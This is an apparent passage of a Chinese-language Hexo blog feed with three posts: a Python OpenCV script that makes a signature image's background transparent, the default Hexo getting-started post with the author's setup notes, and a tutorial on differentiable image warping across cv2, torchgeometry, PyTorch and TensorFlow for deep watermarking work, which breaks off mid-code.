      <link href="/2022/07/01/%E7%94%9F%E6%88%90%E6%9C%89%E9%80%8F%E6%98%8E%E5%BA%A6%E7%9A%84%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
      <url>/2022/07/01/%E7%94%9F%E6%88%90%E6%9C%89%E9%80%8F%E6%98%8E%E5%BA%A6%E7%9A%84%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 有读取灰度，读取4通道透明度函数，直接修改透明度，结果必须保存png(可以具有透明度层)</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imread_four_channel</span>(<span class="params">img</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    img : rgb</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    b_channel, g_channel, r_channel = cv.split(img)</span><br><span class="line">    alpha_channel = np.ones(b_channel.shape, dtype=b_channel.dtype) * <span class="number">255</span>  <span class="comment"># alpha通道每个像素点区间为[0,255], 0为完全透明，255是完全不透明</span></span><br><span class="line">    img_BGRA = cv.merge((b_channel, g_channel, r_channel, alpha_channel))</span><br><span class="line">    <span class="keyword">return</span> img_BGRA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_touming_pic</span>(<span class="params">img, gray</span>):</span><br><span class="line">    a, b, _ = img.shape</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">            <span class="keyword">if</span> gray[i, j] &gt; <span class="number">100</span>:</span><br><span class="line">                img[i, j, <span class="number">3</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    gray = cv.imread(<span class="string">&quot;./1.png&quot;</span>, <span class="number">0</span>)</span><br><span class="line">    gray = np.where(gray &lt; <span class="number">100</span>, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">    img = cv.merge((gray, gray, gray))</span><br><span class="line">    pic2 = imread_four_channel(img)</span><br><span class="line">    pic2 = gen_touming_pic(pic2, gray)</span><br><span class="line">    cv.imwrite(<span class="string">&quot;touming_sig.png&quot;</span>, pic2)</span><br></pre></td></tr></table></figure><p>示例不加了，传签名感觉不大好。</p><p>这个脚本还是很有用的。</p>]]></content>
      
      
      <categories>
          
          <category> python小项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cv </tag>
            
            <tag> python </tag>
            
            <tag> 透明度 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World hexo!</title>
      <link href="/2022/06/30/hello-world/"/>
      <url>/2022/06/30/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br><span class="line">$ hexo new <span class="string">&quot;标题&quot;</span></span><br></pre></td></tr></table></figure><p>新建文章会自带文章属性名，就是文章最上面的title和标签一类</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new  -n <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>似乎会自动添加图片存放文件夹，在同目录下的同名文件夹下就是图片文件夹，注意在Typora中设置图片存放目录</p><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br><span class="line">$ hexo g</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><h2 id="图片引用方法"><a href="#图片引用方法" class="headerlink" title="图片引用方法"></a>图片引用方法</h2><ul><li>修改图像保存路径为本目录下的图片文件夹</li><li>修改自动保存路径为日期(年-月-日)+标题+图片名称。这里可以看github&#x2F;gitee里面的源文件在哪里。因为源代码html和图片在同目录下的</li><li>什么相对路径的会无法识别</li><li>在md的本地是识别不了的，但是在网站上是可以识别的</li><li>文章标题最好是英文的，不然中文弄成Unicode编码感觉很麻烦，图片引用路径也不好操作</li><li>%5C 这种大小还改成&#x2F;的吧，是Unicode编码</li></ul><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><ul><li>github SSH报错<a href="https://blog.csdn.net/weixin_41256398/article/details/117994899">https://blog.csdn.net/weixin_41256398/article/details/117994899</a>  原因在于签名错误或者过期</li><li>注意head格式，不要加一些奇奇怪怪的东西，比如标题前加[xxx]，会报错；tags和categories里面有多个需要加入[]，使用中文逗号隔断。</li></ul><p>正确格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: ssh and ssl</span><br><span class="line">date: 2023-04-18 20:39:51</span><br><span class="line">tags: [信息安全，本科生]</span><br><span class="line">categories: [AI，信息安全]</span><br><span class="line">---</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>warp</title>
      <link href="/2022/06/30/warp/"/>
      <url>/2022/06/30/warp/</url>
      
        <content type="html"><![CDATA[<h1 id="warp在不同python库函数中的实现"><a href="#warp在不同python库函数中的实现" class="headerlink" title="warp在不同python库函数中的实现"></a>warp在不同python库函数中的实现</h1><blockquote><p>做深度水印工作有感，warp的代码还是挺难找的。主要使用的是仿射变换实现，否则不可微。</p></blockquote><h2 id="cv2"><a href="#cv2" class="headerlink" title="cv2"></a>cv2</h2><p>不知道，谁拿cv2塞到网络里面呀</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">w,h,_ = img.shape</span><br><span class="line"></span><br><span class="line">src_points = np.array([[<span class="number">165.</span>, <span class="number">270.</span>], [<span class="number">400.</span>, <span class="number">270.</span>], [<span class="number">360.</span>, <span class="number">125.</span>], [<span class="number">400.</span>, <span class="number">125.</span>]], dtype=<span class="string">&quot;float32&quot;</span>)</span><br><span class="line"></span><br><span class="line">dst_points = np.array([[<span class="number">165.</span>, <span class="number">270.</span>], [<span class="number">400.</span>, <span class="number">270.</span>], [<span class="number">165.</span>, <span class="number">30.</span>], [<span class="number">400.</span>, <span class="number">30.</span>]], dtype=<span class="string">&quot;float32&quot;</span>)</span><br><span class="line"></span><br><span class="line">M = cv2.getPerspectiveTransform(src_points, dst_points)</span><br><span class="line"></span><br><span class="line">M = np.linalg.inv(M)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(M)</span><br><span class="line"></span><br><span class="line">out_img = cv2.warpPerspective(img,M,(h,w))</span><br><span class="line"></span><br><span class="line">cv2.imshow(<span class="string">&quot;img&quot;</span>,out_img)</span><br><span class="line"></span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h2 id="torchgeometry"><a href="#torchgeometry" class="headerlink" title="torchgeometry"></a>torchgeometry</h2><p><a href="https://pypi.org/project/torchgeometry/">https://pypi.org/project/torchgeometry/</a></p><p>可微，这是stegastamp-torch复现里面的写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这段函数是必要的，而获取畸变矩阵M的方式多样。M为[1,1,3,3]大小的矩阵。用于透视畸变，不过是矩阵乘法</span></span><br><span class="line"><span class="keyword">import</span> torchgeometry</span><br><span class="line">input_warped = torchgeometry.warp_perspective(image_input, M[:, <span class="number">1</span>, :, :], dsize=(<span class="number">400</span>, <span class="number">400</span>), flags=<span class="string">&#x27;bilinear&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="求矩阵方法1：torchgeometry自带的解方程函数，反正输入四对点就行"><a href="#求矩阵方法1：torchgeometry自带的解方程函数，反正输入四对点就行" class="headerlink" title="求矩阵方法1：torchgeometry自带的解方程函数，反正输入四对点就行"></a>求矩阵方法1：torchgeometry自带的解方程函数，反正输入四对点就行</h3><p><a href="https://kornia.readthedocs.io/en/v0.1.2/warp_perspective.html">https://kornia.readthedocs.io/en/v0.1.2/warp_perspective.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_geo</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    求透视畸变矩阵的方法2，方法1使用cv2的geo函数，载入现有四个点[x,y]，和4个目标点[x,y]。获取畸变矩阵。</span></span><br><span class="line"><span class="string">    @return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">import</span> torch</span><br><span class="line">    <span class="keyword">import</span> torchgeometry <span class="keyword">as</span> tgm</span><br><span class="line">    <span class="keyword">import</span> cv2</span><br><span class="line">    points_src = torch.FloatTensor([[</span><br><span class="line">        [<span class="number">125</span>, <span class="number">150</span>], [<span class="number">562</span>, <span class="number">40</span>], [<span class="number">562</span>, <span class="number">282</span>], [<span class="number">54</span>, <span class="number">328</span>],</span><br><span class="line">    ]])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the destination points are the image vertexes</span></span><br><span class="line">    h, w = <span class="number">64</span>, <span class="number">128</span>  <span class="comment"># destination size</span></span><br><span class="line">    points_dst = torch.FloatTensor([[</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>], [w - <span class="number">1</span>, <span class="number">0</span>], [w - <span class="number">1</span>, h - <span class="number">1</span>], [<span class="number">0</span>, h - <span class="number">1</span>],</span><br><span class="line">    ]])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compute perspective transform</span></span><br><span class="line">    M = tgm.get_perspective_transform(points_src, points_dst)</span><br><span class="line">    <span class="built_in">print</span>(M)</span><br><span class="line">    <span class="built_in">print</span>(M.shape)</span><br></pre></td></tr></table></figure><h3 id="求矩阵方法2-使用opencv获取，也是给四个点就行"><a href="#求矩阵方法2-使用opencv获取，也是给四个点就行" class="headerlink" title="求矩阵方法2 使用opencv获取，也是给四个点就行"></a>求矩阵方法2 使用opencv获取，也是给四个点就行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    rect = np.array([</span><br><span class="line">        [tl_x, tl_y],</span><br><span class="line">        [tr_x + image_size, tr_y],</span><br><span class="line">        [br_x + image_size, br_y + image_size],</span><br><span class="line">        [bl_x, bl_y + image_size]], dtype=<span class="string">&quot;float32&quot;</span>)</span><br><span class="line"></span><br><span class="line">    dst = np.array([</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [image_size, <span class="number">0</span>],</span><br><span class="line">        [image_size, image_size],</span><br><span class="line">        [<span class="number">0</span>, image_size]], dtype=<span class="string">&quot;float32&quot;</span>)</span><br><span class="line"></span><br><span class="line">    M = cv2.getPerspectiveTransform(rect, dst)</span><br><span class="line">    M_inv = np.linalg.inv(M)</span><br><span class="line">    Ms[i, <span class="number">0</span>, :, :] = M_inv</span><br><span class="line">    Ms[i, <span class="number">1</span>, :, :] = M</span><br><span class="line">Ms = torch.from_numpy(Ms).<span class="built_in">float</span>()</span><br></pre></td></tr></table></figure><h3 id="这段表示生成的四个目标点在图像的边缘分布，使用cv2的geo函数解方程获取畸变矩阵"><a href="#这段表示生成的四个目标点在图像的边缘分布，使用cv2的geo函数解方程获取畸变矩阵" class="headerlink" title="这段表示生成的四个目标点在图像的边缘分布，使用cv2的geo函数解方程获取畸变矩阵"></a>这段表示生成的四个目标点在图像的边缘分布，使用cv2的geo函数解方程获取畸变矩阵</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> torchgeometry</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_rand_transform_matrix</span>(<span class="params">image_size, d, batch_size</span>):</span><br><span class="line">    Ms = np.zeros((batch_size, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(batch_size):</span><br><span class="line">        tl_x = random.uniform(-d, d)  <span class="comment"># Top left corner, top</span></span><br><span class="line">        tl_y = random.uniform(-d, d)  <span class="comment"># Top left corner, left</span></span><br><span class="line">        bl_x = random.uniform(-d, d)  <span class="comment"># Bot left corner, bot</span></span><br><span class="line">        bl_y = random.uniform(-d, d)  <span class="comment"># Bot left corner, left</span></span><br><span class="line">        tr_x = random.uniform(-d, d)  <span class="comment"># Top right corner, top</span></span><br><span class="line">        tr_y = random.uniform(-d, d)  <span class="comment"># Top right corner, right</span></span><br><span class="line">        br_x = random.uniform(-d, d)  <span class="comment"># Bot right corner, bot</span></span><br><span class="line">        br_y = random.uniform(-d, d)  <span class="comment"># Bot right corner, right</span></span><br><span class="line"></span><br><span class="line">        rect = np.array([</span><br><span class="line">            [tl_x, tl_y],</span><br><span class="line">            [tr_x + image_size, tr_y],</span><br><span class="line">            [br_x + image_size, br_y + image_size],</span><br><span class="line">            [bl_x, bl_y + image_size]], dtype=<span class="string">&quot;float32&quot;</span>)</span><br><span class="line"></span><br><span class="line">        dst = np.array([</span><br><span class="line">            [<span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">            [image_size, <span class="number">0</span>],</span><br><span class="line">            [image_size, image_size],</span><br><span class="line">            [<span class="number">0</span>, image_size]], dtype=<span class="string">&quot;float32&quot;</span>)</span><br><span class="line"></span><br><span class="line">        M = cv2.getPerspectiveTransform(rect, dst)</span><br><span class="line">        M_inv = np.linalg.inv(M)</span><br><span class="line">        Ms[i, <span class="number">0</span>, :, :] = M_inv</span><br><span class="line">        Ms[i, <span class="number">1</span>, :, :] = M</span><br><span class="line">    Ms = torch.from_numpy(Ms).<span class="built_in">float</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Ms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warp_genel</span>(<span class="params">image_input,global_step</span>):</span><br><span class="line">    width = <span class="number">256</span></span><br><span class="line">    rnd_trans= <span class="number">0.1</span></span><br><span class="line">    rnd_trans_ramp= <span class="number">1000</span></span><br><span class="line">    rnd_tran = <span class="built_in">min</span>(rnd_trans * global_step / rnd_trans_ramp, rnd_trans)</span><br><span class="line">    rnd_tran = np.random.uniform() * rnd_tran</span><br><span class="line">    Ms = get_rand_transform_matrix(width, np.floor(width * rnd_tran), batch_size=<span class="number">1</span>).cuda()</span><br><span class="line"></span><br><span class="line">    input_warped = torchgeometry.warp_perspective(image_input, Ms[:, <span class="number">1</span>, :, :], dsize=(<span class="number">256</span>, <span class="number">256</span>), flags=<span class="string">&#x27;bilinear&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> input_warped</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    img_path = <span class="string">r&#x27;./data/DIV2K_train_HR/0801.png&#x27;</span></span><br><span class="line">    img = cv2.imread(img_path,<span class="number">0</span>)</span><br><span class="line">    img = img[<span class="number">40</span>:<span class="number">256</span>,<span class="number">0</span>:<span class="number">256</span>]</span><br><span class="line">    img_torch = transforms.ToTensor()(img)</span><br><span class="line">    img_torch = img_torch.unsqueeze(<span class="number">0</span>).cuda()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># brighten_layer = get_rnd_brightness(0.4, 0.3, 1).cuda()</span></span><br><span class="line">    <span class="comment"># img = img_torch + brighten_layer * 0.5</span></span><br><span class="line">    <span class="comment"># blur(花里胡哨的random blur删除了，换为固定模糊核心)</span></span><br><span class="line">    <span class="comment"># blur_layer = get_gaussian_kernel().cuda()</span></span><br><span class="line">    <span class="comment"># encoded_image = blur_layer(img_torch)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># for i in range(0, 100, 5):</span></span><br><span class="line">    <span class="comment">#     img = transform_net(img_torch, Hp, global_step=i)</span></span><br><span class="line">    <span class="comment">#     img = img.squeeze(0)</span></span><br><span class="line">    <span class="comment">#     img = img.cpu().numpy().transpose(1, 2, 0)</span></span><br><span class="line">    <span class="comment">#     cv.imshow(&quot;1&quot;, img)</span></span><br><span class="line">    <span class="comment">#     cv.waitKey(0)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># img_torch = torch.cat((img_torch,img_torch),0)</span></span><br><span class="line">    <span class="comment"># print(img_torch.shape)</span></span><br><span class="line">    <span class="comment"># # img_torch = torch.rand(1, 3, 1024, 2048).cuda()</span></span><br><span class="line">    <span class="comment"># a,b = img_torch.shape[2], img_torch.shape[3]</span></span><br><span class="line">    <span class="comment"># J = DiffJPEG.DiffJPEG(width=b, differentiable=True, quality=80, height=a)  # 压缩质量判定</span></span><br><span class="line">    <span class="comment"># contain_out = J(img_torch)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># blur_layer = get_gaussian_kernel().cuda()</span></span><br><span class="line">    <span class="comment"># blured_img = blur_layer(img_torch)</span></span><br><span class="line">    <span class="comment"># print(blured_img.shape)</span></span><br><span class="line">    <span class="comment"># img = blured_img</span></span><br><span class="line">    <span class="comment"># print()</span></span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        img = warp_genel(img_torch,epoch*<span class="number">5</span>)</span><br><span class="line">        img = img.squeeze(<span class="number">0</span>)</span><br><span class="line">        img = img.cpu().numpy().transpose(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">        cv2.imshow(<span class="string">&quot;1&quot;</span>,img)</span><br><span class="line">        <span class="built_in">print</span>(epoch*<span class="number">10</span>)</span><br><span class="line">        cv2.waitKey(<span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>使用代码是这样的，原理应该是通过随机图像的周围4个点，求出仿射矩阵Ms，再计算扭曲的图像。</p><p>代码里面是针对256，256方形图像，因为(d,d),；不是方形的图像大概要改成(d,w)，让点描在边缘，求出此次的仿射矩阵。</p><h2 id="pytorch"><a href="#pytorch" class="headerlink" title="pytorch"></a>pytorch</h2><p><a href="https://pytorch.org/docs/stable/generated/torch.nn.functional.affine_grid.html">https://pytorch.org/docs/stable/generated/torch.nn.functional.affine_grid.html</a></p><p>详细：<a href="https://blog.csdn.net/Eddy_Wu23/article/details/108797023?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-108797023-blog-83244785.pc_relevant_multi_platform_featuressortv2dupreplace&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-108797023-blog-83244785.pc_relevant_multi_platform_featuressortv2dupreplace&amp;utm_relevant_index=4">https://blog.csdn.net/Eddy_Wu23/article/details/108797023?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-108797023-blog-83244785.pc_relevant_multi_platform_featuressortv2dupreplace&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-108797023-blog-83244785.pc_relevant_multi_platform_featuressortv2dupreplace&amp;utm_relevant_index=4</a></p><p><img src="/2022/06/30/warp/image-20220816103802139.png" alt="image-20220816103802139"></p><p>F.affine_grid表示仿射变化，只能表示仿射变换，不能表示扭曲变化，对于二维theta是2 X 3 的矩阵，对于三维是3 X 4 的矩阵。</p><p>仿射变换只有x,y轴的变换，没有Z轴的变换。</p><p>最右侧一列可以平移，其他的位置最好不要动，在三维中，三个通道是可以分离的，会导致三个通道分离，Z轴变换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">theta = torch.tensor([</span><br><span class="line">    [<span class="number">3</span>, t1, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [t2, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">], dtype=torch.<span class="built_in">float</span>)</span><br><span class="line">grid = F.affine_grid(theta.unsqueeze(<span class="number">0</span>), img_torch.unsqueeze(<span class="number">0</span>).size()).cuda()</span><br><span class="line">output = F.grid_sample(img_torch.unsqueeze(<span class="number">0</span>), grid)</span><br><span class="line">new_img_torch = output[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><blockquote><p>一直有个疑问，为什么这个仿射变换和仿射变换公式不一样；看到上述URL2，发现此处的torch仿射变换F.affine_grid，是对theta仿射矩阵进行了求逆矩阵操作的。theta &#x3D; [θ]^-1.</p></blockquote><p>theta为三级矩阵，显然可微，因为就是一个矩阵乘法</p><p>图像变换矩阵，前3列，第4列为4维张量新加入部分。若为3通道图像，则不需要加入第4列。</p><p><img src="/2022/06/30/warp/wps2.jpg" alt="wps2.jpg"></p><p>保证<img src="/2022/06/30/warp/wps3.jpg" alt="wps2.jpg">，其中，A为2阶矩阵，B为1阶矩阵。</p><p>当前3列不为对角矩阵时，为图像扭曲函数，此为一般情况。</p><p>其中，(1,2)(2,1)位置应当偏小一些，由(1,1)(2,2)位置控制缩放大小。</p><p>一般而言，(1,2)(2,1)控制微调，(1,1)(2,2)控制大小。</p><h2 id="torchvision"><a href="#torchvision" class="headerlink" title="torchvision"></a>torchvision</h2><p>不可微，而且还是带有随机参数的，毕竟本来就是randomaffine，是拿来做数据扩展的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transform</span><br><span class="line">transform.RandomAffine(degrees=<span class="number">0</span>, translate=(<span class="number">0</span>, <span class="number">0</span>), shear=[<span class="number">20</span>,<span class="number">90</span>])(img0)</span><br></pre></td></tr></table></figure><h2 id="tensorflow"><a href="#tensorflow" class="headerlink" title="tensorflow"></a>tensorflow</h2><p>stegastamp -tensorflow 使用的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#读取图像</span></span><br><span class="line">img=cv2.imread(<span class="string">&#x27;/home/xp1/Pictures/004545.jpg&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">input</span>=tf.placeholder(dtype=np.uint8,shape=[<span 